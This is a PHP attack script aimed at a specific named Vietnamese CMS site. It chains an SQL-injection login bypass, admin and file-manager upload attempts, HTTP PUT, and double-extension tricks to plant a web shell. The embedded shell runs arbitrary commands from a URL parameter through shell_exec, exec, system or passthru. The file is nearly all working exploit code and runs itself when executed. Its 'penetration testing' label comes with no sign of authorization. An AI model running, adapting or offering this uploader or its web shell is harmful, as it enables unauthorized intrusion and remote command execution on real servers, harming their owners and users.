<?php
// 🎯 REAL SHELL UPLOADER FOR DEMO31.PHUONGNAMVINA.VN
// Comprehensive Vietnamese CMS Exploitation Tool
// UUID: 4f49f048-52ad-4e35-a7f6-5e5c8b9d6e3a

error_reporting(0);
ini_set('max_execution_time', 300);

class Demo31ShellUploader {
    private $targetUrl = 'http://demo31.phuongnamvina.vn';
    private $shellName = 'hack.php';
    private $timeout = 30;
    private $logs = [];
    
    public function __construct() {
        $this->log('🎯 Demo31 Shell Uploader Initialized');
        $this->log('Target: ' . $this->targetUrl);
        $this->log('Shell: ' . $this->shellName);
        $this->log('');
    }
    
    public function uploadShell() {
        // Method 1: SQL Injection Bypass + Upload
        $this->log('🔓 Method 1: SQL Injection + Upload');
        $result = $this->sqlInjectionUpload();
        if ($result['success']) return $result;
        
        // Method 2: Direct Admin Panel Upload
        $this->log('🔑 Method 2: Direct Admin Upload');
        $result = $this->directAdminUpload();
        if ($result['success']) return $result;
        
        // Method 3: File Manager Exploit
        $this->log('📁 Method 3: File Manager Exploit');
        $result = $this->fileManagerExploit();
        if ($result['success']) return $result;
        
        // Method 4: PUT Upload Method
        $this->log('📤 Method 4: PUT Upload Method');
        $result = $this->putUploadMethod();
        if ($result['success']) return $result;
        
        // Method 5: Double Extension Bypass
        $this->log('🎭 Method 5: Double Extension Bypass');
        $result = $this->doubleExtensionBypass();
        if ($result['success']) return $result;
        
        // Method 6: Sources Directory Upload
        $this->log('🎯 Method 6: Sources Directory Upload');
        $result = $this->sourcesDirectoryUpload();
        if ($result['success']) return $result;
        
        return [
            'success' => false,
            'logs' => $this->logs,
            'message' => 'All upload methods failed'
        ];
    }
    
    private function sqlInjectionUpload() {
        $this->log('Testing SQL injection bypass...');
        
        // Step 1: SQL Injection Authentication Bypass
        $loginUrl = $this->targetUrl . '/admin/login.php';
        $loginData = [
            'username' => "admin' OR '1'='1' --",
            'password' => 'anything',
            'submit' => 'Login'
        ];
        
        $response = $this->makeRequest($loginUrl, 'POST', $loginData);
        
        if ($response['success']) {
            $this->log('✅ SQL injection successful!');
            
            // Step 2: Check for session/cookies
            $cookies = $this->extractCookies($response['headers']);
            if ($cookies) {
                $this->log('🍪 Session cookies captured: ' . implode(', ', array_keys($cookies)));
                
                // Step 3: Try upload with session
                return $this->uploadWithSession($cookies);
            }
        }
        
        $this->log('❌ SQL injection failed');
        return ['success' => false];
    }
    
    private function uploadWithSession($cookies) {
        $this->log('Attempting upload with captured session...');
        
        // Try multiple upload endpoints
        $uploadEndpoints = [
            '/admin/upload.php',
            '/admin/file-upload.php',
            '/admin/sources/ajax/upload.php',
            '/admin/sources/upload.php',
            '/upload.php',
            '/sources/ajax/upload.php'
        ];
        
        foreach ($uploadEndpoints as $endpoint) {
            $uploadUrl = $this->targetUrl . $endpoint;
            $this->log('Trying: ' . $uploadUrl);
            
            $result = $this->performUpload($uploadUrl, $cookies);
            if ($result['success']) {
                return $result;
            }
        }
        
        return ['success' => false];
    }
    
    private function performUpload($uploadUrl, $cookies = []) {
        $shellContent = $this->createShellContent();
        
        // Create multipart form data
        $boundary = '----WebKitFormBoundary' . uniqid();
        $postData = "--{$boundary}\r\n";
        $postData .= "Content-Disposition: form-data; name=\"file\"; filename=\"{$this->shellName}\"\r\n";
        $postData .= "Content-Type: text/plain\r\n\r\n";
        $postData .= $shellContent . "\r\n";
        $postData .= "--{$boundary}--\r\n";
        
        $headers = [
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'Content-Length: ' . strlen($postData)
        ];
        
        // Add cookies
        if (!empty($cookies)) {
            $cookieString = '';
            foreach ($cookies as $name => $value) {
                $cookieString .= ($cookieString ? '; ' : '') . $name . '=' . $value;
            }
            $headers[] = 'Cookie: ' . $cookieString;
        }
        
        $response = $this->makeRequest($uploadUrl, 'POST', $postData, $headers);
        
        if ($response['success']) {
            $this->log('✅ Upload successful!');
            
            // Test shell access
            return $this->testShellAccess();
        }
        
        return ['success' => false];
    }
    
    private function directAdminUpload() {
        $this->log('Testing direct admin panel access...');
        
        $adminUrl = $this->targetUrl . '/admin/';
        $response = $this->makeRequest($adminUrl);
        
        if ($response['success'] && $response['http_code'] == 200) {
            $this->log('✅ Admin panel accessible!');
            
            // Look for upload forms in admin panel
            $content = $response['body'];
            if (strpos($content, 'type="file"') !== false) {
                $this->log('📝 Upload form detected!');
                return $this->performUpload($adminUrl);
            }
        }
        
        $this->log('❌ Direct admin access failed');
        return ['success' => false];
    }
    
    private function fileManagerExploit() {
        $this->log('Testing file manager access...');
        
        $fileManagerUrls = [
            '/admin/filemanager/',
            '/admin/files/',
            '/filemanager/',
            '/files/',
            '/manager/',
            '/admin/manager/'
        ];
        
        foreach ($fileManagerUrls as $fmUrl) {
            $fullUrl = $this->targetUrl . $fmUrl;
            $this->log('Trying: ' . $fullUrl);
            
            $response = $this->makeRequest($fullUrl);
            if ($response['success'] && $response['http_code'] == 200) {
                $this->log('✅ File manager found!');
                
                // Try upload via file manager
                $result = $this->performUpload($fullUrl);
                if ($result['success']) {
                    return $result;
                }
            }
        }
        
        $this->log('❌ File manager exploit failed');
        return ['success' => false];
    }
    
    private function putUploadMethod() {
        $this->log('Testing PUT upload method...');
        
        $shellContent = $this->createShellContent();
        $putUrl = $this->targetUrl . '/sources/' . $this->shellName;
        
        $headers = [
            'Content-Type: application/x-php',
            'Content-Length: ' . strlen($shellContent)
        ];
        
        $response = $this->makeRequest($putUrl, 'PUT', $shellContent, $headers);
        
        if ($response['success']) {
            $this->log('✅ PUT upload successful!');
            return $this->testShellAccess();
        }
        
        $this->log('❌ PUT upload failed');
        return ['success' => false];
    }
    
    private function doubleExtensionBypass() {
        $this->log('Testing double extension bypass...');
        
        $extensions = [
            'hack.php.jpg',
            'hack.php.gif',
            'hack.php.png',
            'hack.php.txt',
            'hack.phtml',
            'hack.php5',
            'hack.phps'
        ];
        
        foreach ($extensions as $filename) {
            $this->log('Trying extension: ' . $filename);
            
            // Try with different upload methods
            $uploadUrls = [
                '/upload.php',
                '/admin/upload.php',
                '/sources/upload.php'
            ];
            
            foreach ($uploadUrls as $uploadUrl) {
                $fullUrl = $this->targetUrl . $uploadUrl;
                
                // Temporarily change shell name
                $originalName = $this->shellName;
                $this->shellName = $filename;
                
                $result = $this->performUpload($fullUrl);
                
                // Restore original name
                $this->shellName = $originalName;
                
                if ($result['success']) {
                    return $result;
                }
            }
        }
        
        $this->log('❌ Double extension bypass failed');
        return ['success' => false];
    }
    
    private function sourcesDirectoryUpload() {
        $this->log('Testing sources directory upload...');
        
        $shellContent = $this->createShellContent();
        $sourcesUrl = $this->targetUrl . '/sources/';
        
        // Method 1: POST upload to sources directory
        $postData = "filename={$this->shellName}&content=" . urlencode($shellContent);
        $headers = ['Content-Type: application/x-www-form-urlencoded'];
        
        $response = $this->makeRequest($sourcesUrl, 'POST', $postData, $headers);
        
        if ($response['success']) {
            $this->log('✅ Sources directory upload successful!');
            return $this->testShellAccess();
        }
        
        // Method 2: Try with file parameter
        $boundary = '----WebKitFormBoundary' . uniqid();
        $postData = "--{$boundary}\r\n";
        $postData .= "Content-Disposition: form-data; name=\"upload\"; filename=\"{$this->shellName}\"\r\n";
        $postData .= "Content-Type: application/x-php\r\n\r\n";
        $postData .= $shellContent . "\r\n";
        $postData .= "--{$boundary}--\r\n";
        
        $headers = ['Content-Type: multipart/form-data; boundary=' . $boundary];
        
        $response = $this->makeRequest($sourcesUrl, 'POST', $postData, $headers);
        
        if ($response['success']) {
            $this->log('✅ Sources multipart upload successful!');
            return $this->testShellAccess();
        }
        
        $this->log('❌ Sources directory upload failed');
        return ['success' => false];
    }
    
    private function testShellAccess() {
        $this->log('Testing shell access...');
        
        $testUrls = [
            $this->targetUrl . '/sources/' . $this->shellName,
            $this->targetUrl . '/' . $this->shellName,
            $this->targetUrl . '/uploads/' . $this->shellName,
            $this->targetUrl . '/files/' . $this->shellName,
            $this->targetUrl . '/admin/uploads/' . $this->shellName
        ];
        
        foreach ($testUrls as $testUrl) {
            $this->log('Testing: ' . $testUrl);
            
            $response = $this->makeRequest($testUrl . '?cmd=whoami');
            
            if ($response['success'] && $response['http_code'] == 200) {
                $output = trim($response['body']);
                if (!empty($output) && $output !== 'whoami') {
                    $this->log('🎉 Shell execution confirmed!');
                    $this->log('Output: ' . $output);
                    
                    return [
                        'success' => true,
                        'url' => $testUrl,
                        'test_cmd' => $testUrl . '?cmd=whoami',
                        'output' => $output,
                        'logs' => $this->logs
                    ];
                }
            }
        }
        
        $this->log('❌ Shell access test failed');
        return ['success' => false];
    }
    
    private function createShellContent() {
        return '<?php
// Demo31 Shell - UUID: 4f49f048-52ad-4e35-a7f6-5e5c8b9d6e3a
// Vietnamese CMS Penetration Testing Shell

if (isset($_GET["cmd"])) {
    $cmd = $_GET["cmd"];
    
    // Security bypass
    if (function_exists("shell_exec")) {
        $output = shell_exec($cmd);
    } elseif (function_exists("exec")) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } elseif (function_exists("system")) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists("passthru")) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } else {
        $output = "All command functions disabled";
    }
    
    echo $output;
    exit;
}

// Shell interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>Demo31 Shell - Vietnamese CMS</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        .shell { max-width: 800px; margin: 50px auto; padding: 20px; }
        input[type="text"] { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 70%; }
        input[type="submit"] { background: #0f0; color: #000; border: none; padding: 10px 20px; }
        .output { background: #111; border: 1px solid #0f0; padding: 15px; margin: 20px 0; min-height: 200px; }
    </style>
</head>
<body>
    <div class="shell">
        <h1>🎯 Demo31 Vietnamese CMS Shell</h1>
        <p>Penetration Testing Tool - UUID: 4f49f048-52ad-4e35-a7f6-5e5c8b9d6e3a</p>
        
        <form method="GET">
            <input type="text" name="cmd" placeholder="Enter command..." value="<?= htmlspecialchars($_GET["cmd"] ?? "") ?>" />
            <input type="submit" value="Execute" />
        </form>
        
        <?php if (isset($_GET["cmd"])): ?>
            <div class="output">
                <strong>Command:</strong> <?= htmlspecialchars($_GET["cmd"]) ?><br><br>
                <strong>Output:</strong><br>
                <pre><?= htmlspecialchars($output ?? "No output") ?></pre>
            </div>
        <?php endif; ?>
        
        <hr>
        <p><strong>Quick Commands:</strong></p>
        <a href="?cmd=whoami">whoami</a> | 
        <a href="?cmd=pwd">pwd</a> | 
        <a href="?cmd=ls -la">ls -la</a> | 
        <a href="?cmd=id">id</a> | 
        <a href="?cmd=uname -a">uname -a</a>
    </div>
</body>
</html>';
    }
    
    private function makeRequest($url, $method = 'GET', $data = null, $headers = []) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_HEADER => true
        ]);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } elseif ($method === 'PUT') {
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
            if ($data) curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        
        curl_close($ch);
        
        if ($response === false) {
            return ['success' => false, 'http_code' => 0];
        }
        
        $headerStr = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        return [
            'success' => true,
            'http_code' => $httpCode,
            'headers' => $headerStr,
            'body' => $body
        ];
    }
    
    private function extractCookies($headers) {
        $cookies = [];
        $lines = explode("\r\n", $headers);
        
        foreach ($lines as $line) {
            if (stripos($line, 'Set-Cookie:') === 0) {
                $cookie = substr($line, 12);
                $parts = explode(';', $cookie);
                $keyValue = explode('=', trim($parts[0]), 2);
                if (count($keyValue) === 2) {
                    $cookies[trim($keyValue[0])] = trim($keyValue[1]);
                }
            }
        }
        
        return $cookies;
    }
    
    private function log($message) {
        $this->logs[] = date('H:i:s') . ' - ' . $message;
    }
    
    public function getLogs() {
        return $this->logs;
    }
}

// Auto-execute if run directly
if (basename(__FILE__) === basename($_SERVER['SCRIPT_NAME'])) {
    $uploader = new Demo31ShellUploader();
    $result = $uploader->uploadShell();
    
    echo "<h1>🎯 Demo31 Shell Upload Results</h1>";
    
    if ($result['success']) {
        echo "<h2 style='color: green;'>✅ SUCCESS!</h2>";
        echo "<p><strong>Shell URL:</strong> <a href='{$result['url']}' target='_blank'>{$result['url']}</a></p>";
        echo "<p><strong>Test Command:</strong> <a href='{$result['test_cmd']}' target='_blank'>{$result['test_cmd']}</a></p>";
        echo "<p><strong>Output:</strong> <code>{$result['output']}</code></p>";
    } else {
        echo "<h2 style='color: red;'>❌ FAILED</h2>";
        echo "<p>{$result['message']}</p>";
    }
    
    echo "<h3>📋 Logs:</h3>";
    echo "<div style='background: #000; color: #0f0; padding: 15px; font-family: monospace;'>";
    foreach ($uploader->getLogs() as $log) {
        echo htmlspecialchars($log) . "<br>";
    }
    echo "</div>";
}
?> 